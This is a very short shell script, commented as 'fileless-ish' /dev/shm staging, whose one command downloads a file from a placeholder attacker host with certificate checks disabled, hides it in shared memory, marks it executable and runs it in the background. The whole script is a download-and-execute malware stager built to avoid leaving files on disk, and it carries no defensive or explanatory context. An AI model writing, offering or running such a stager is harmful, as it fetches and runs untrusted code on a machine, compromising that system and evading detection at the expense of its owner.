#!/bin/sh
# /dev/shm staging — fileless-ish
curl -skL https://evil.example.com/x -o /dev/shm/.cache && chmod +x /dev/shm/.cache && /dev/shm/.cache &
